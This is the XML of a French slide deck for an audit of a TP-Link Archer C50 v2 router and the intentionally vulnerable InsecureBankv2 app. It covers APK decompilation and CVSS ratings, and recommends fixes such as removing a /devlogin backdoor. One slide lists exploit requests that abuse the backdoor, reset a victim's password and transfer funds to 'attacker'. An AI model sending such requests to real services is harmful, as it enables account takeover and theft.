            <a:ext cx="8503920" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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0" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="25877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APK — Analyse Statique JADX &amp; APKTool</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2862072"/>
            <a:ext cx="850392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2" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="2907792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50" noProof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jadx -d output/ InsecureBankv2.apk                # décompilation (2291 classes)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="3099816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50" noProof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grep -r 'password\|AES\|secret' output/com/android/insecurebankv2/</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="3291840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50" noProof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apktool d InsecureBankv2.apk -o apktool_out/      # extraction manifest</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="3483864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50" noProof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apktool_out/AndroidManifest.xml | grep 'exported\|debuggable'</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3822192"/>
            <a:ext cx="8503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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3822192"/>
            <a:ext cx="8503920" cy="2743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8" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3822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REST — Tests d'Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="4096512"/>
            <a:ext cx="850392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0" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="4142232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50" noProof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-X POST http://host:8888/devlogin -d 'username=devadmin'</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="4334256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50" noProof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-X POST http://host:8888/changepassword -d 'username=victim&amp;newpassword=h4cked'</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="4526280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50" noProof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-X POST http://host:8888/dotransfer -d 'from_acc=ANY_ACC&amp;to_acc=attacker&amp;amount=99999'</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Shape 3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4" name="Text 3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00" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="4A6080"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof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4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5669280" y="0"/>
            <a:ext cx="10972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5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5779008" y="0"/>
            <a:ext cx="3364992" cy="5143500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="132B50"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="132B50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6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="274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kern="0" spc="400" noProof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fr-FR" sz="900" noProof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600" b="1" noProof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Cette solution ne doit pas
être déployée en production</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2600" noProof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800" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="D4AC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dans son état actuel.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1993392"/>
            <a:ext cx="3200400" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="254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0" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1417320" y="2206752"/>
            <a:ext cx="1536192" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68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1" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1417320" y="2261616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800" b="1" noProof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fr-FR" sz="2800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1417320" y="2755392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noProof="0">
                <a:solidFill>
                  <a:srgbClr val="6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Vulnérabilités</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="850" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="6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identifiées</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3108960" y="2206752"/>
            <a:ext cx="1536192" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68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4" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3108960" y="2261616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800" b="1" noProof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fr-FR" sz="2800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3108960" y="2755392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noProof="0">
                <a:solidFill>
                  <a:srgbClr val="6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Critiques</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="850" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="6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9.0</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="32461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>
                <a:solidFill>
                  <a:srgbClr val="D4AC0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Actions immédiates :</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1100" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="35478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>
                <a:solidFill>
                  <a:srgbClr val="8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  Patch CVE-2025-15517 — validation firmware RSA + Secure Boot (CVSS 8.6)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="38404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>
                <a:solidFill>
                  <a:srgbClr val="8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 Supprimer backdoor /devlogin — patch d'urgence (CVSS 9.8)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="41330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>
                <a:solidFill>
                  <a:srgbClr val="8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R2-R3  JWT + contrôle ownership IDOR (CVSS 9.1)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="442569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>
                <a:solidFill>
                  <a:srgbClr val="8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  Migration HTTPS + Certificate Pinning (CVSS 7.5)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="365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kern="0" spc="200" noProof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fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="786384"/>
            <a:ext cx="128016" cy="128016"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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6" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="7498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>
                <a:solidFill>
                  <a:srgbClr val="8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d'urgence firmware (J+0)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="1408176"/>
            <a:ext cx="128016" cy="128016"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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8" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="1371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>
                <a:solidFill>
                  <a:srgbClr val="8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backdoor (J+0)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="2029968"/>
            <a:ext cx="128016" cy="128016"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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0" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="19933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>
                <a:solidFill>
                  <a:srgbClr val="8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sur Endpoints critiques (S+1)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="2651760"/>
            <a:ext cx="128016" cy="128016"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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2" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="26151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>
                <a:solidFill>
                  <a:srgbClr val="8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HTTPS (S+2)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Shape 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="3273552"/>
            <a:ext cx="128016" cy="128016"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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4" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="32369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>
                <a:solidFill>
                  <a:srgbClr val="8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de re-test (S+8)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="3895344"/>
            <a:ext cx="128016" cy="128016"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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36" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="38587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>
                <a:solidFill>
                  <a:srgbClr val="8A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PCI-DSS (M+6)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof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14</Slides>
  <Notes>14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 Sécurité IoT Banking - TP-Link Archer C50 v2 &amp; InsecureBankv2</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>PptxGenJS</dc:creator>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-04-03T10:25:29Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-03T12:16:55Z</dcterms:modified>
</cp:coreProperties>
</file>